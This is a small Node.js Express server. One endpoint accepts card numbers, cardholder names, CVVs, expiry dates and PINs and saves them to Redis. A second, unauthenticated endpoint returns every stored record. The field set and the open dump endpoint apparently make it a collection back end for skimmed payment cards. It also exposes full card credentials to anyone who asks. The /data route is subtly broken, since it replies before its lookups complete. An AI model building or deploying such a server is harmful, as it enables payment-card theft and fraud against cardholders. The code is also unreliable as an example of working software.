const express = require('express');
const redis = require('./redis-config');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/send', (req, res) => {
    const { cardNumber, name, cvv, expDate, pin } = req.body;
    redis.set(cardNumber, JSON.stringify({ name, cvv, expDate, pin }));
    res.status(200).json({ message: 'Data sent' });
});

app.get('/data', (req, res) => {
    const cardNumbers = [];
    redis.keys('*', (err, keys) => {
        if (err) throw err;
        keys.forEach(key => {
            redis.get(key, (err, value) => {
                if (err) throw err;
                cardNumbers.push(value);
            });
        });
        res.status(200).json(cardNumbers);
    });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
